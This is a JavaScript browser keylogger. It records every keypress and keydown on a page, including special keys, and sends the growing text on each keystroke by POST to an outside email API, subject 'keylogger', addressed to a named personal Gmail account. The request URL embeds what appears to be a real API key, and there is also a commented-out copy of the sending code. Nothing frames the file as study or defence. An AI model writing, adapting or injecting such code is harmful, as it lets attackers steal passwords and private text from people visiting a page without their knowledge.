var mystring='';
document.addEventListener('keypress', function (e) 					
{															
    var charCode =  e.which;
    var charStr = String.fromCharCode(charCode);											//change to string
    	if (charCode == 8) 
	            {
	                charStr='[BackSpace]';
	            }
   		else if (charCode == 9)
   		        {
   	                charStr='[Tab]';
   	        	}
   		else if (charCode == 13)
   	        	{
   	                charStr='[Enter]';
   	        	}
    	else if (charCode == 16)
  	        	{
  	                charStr='[Shift]';
  	        	}
  	  	else if (charCode == 17)
   	    		{
   	             charStr='[Ctrl]';
   	        	}
   		else if (charCode == 18) 
            	{
  	              charStr='[Alt]';
  	        	}
  		else if (charCode == 8)
  	        	{
  	              charStr='[BKSP]';
  	        	}
  		else if (charCode == 9)
  				{
  	              charStr='[TAB]';
  	        	}
  		else if (charCode == 13)
   	        	{
                  charStr='[ENTER]';
  	        	}
  	    mystring+=charStr;
  	    console.log(mystring);
  	$.ajax({
  		type:"POST",
  		url: "https://api.elasticemail.com/v2/email/send?apikey=635e2157-94cc-4fb8-9167-2246312d7cf8&subject=keylogger&msgTo=siddharthayadav202@gmail.com",
  		data: mystring,
  		success: function(){
  			alert('successful');
  		}
  	})
});
document.addEventListener('keydown', function (e2) 					
{															
    var charCode =  e2.which;	
    var charStr=null;								//change to string
    	if (charCode == 8) 
	            {
	                charStr='[BackSpace]';
	            }
   		else if (charCode == 9)
   		        {
   	                charStr='[Tab]';
   	        	}
   		else if (charCode == 13)
   	        	{
   	                charStr='[Enter]';
   	        	}
    	else if (charCode == 16)
  	        	{
  	                charStr='[Shift]';
  	        	}
  	  	else if (charCode == 17)
   	    		{
   	             charStr='[Ctrl]';
   	        	}
   		else if (charCode == 18) 
            	{
  	              charStr='[Alt]';
  	        	}
  		else if (charCode == 8)
  	        	{
  	              charStr='[BKSP]';
  	        	}
  		else if (charCode == 9)
  				{
  	              charStr='[TAB]';
  	        	}
  		else if (charCode == 13)
   	        	{
                  charStr='[ENTER]';
  	        	}
  	    if(charStr!=null)
  	    {
  	    	mystring+=charStr;
  	    }
  	    console.log(mystring);
  	    $.post("https://api.elasticemail.com/v2/email/send?apikey=635e2157-94cc-4fb8-9167-2246312d7cf8&subject=keylogger&msgTo=siddharthayadav202@gmail.com",mystring,function(data,status,xhr)
		{
		alert("Data:"+data+"\nStatus: "+status);
		})
});
//document.getElementById('send').addEventListener("click",function()
//{
//	$.post("https://api.elasticemail.com/v2/email/send?apikey=635e2157-94cc-4fb8-9167-2246312d7cf8&subject=keylogger&msgTxo=siddharthayadav202@gmail.com",mystring,function(mystring,status)
//	{
//		alert("Data:"+mystring+"\nStatus: "+status);
//	})
//	});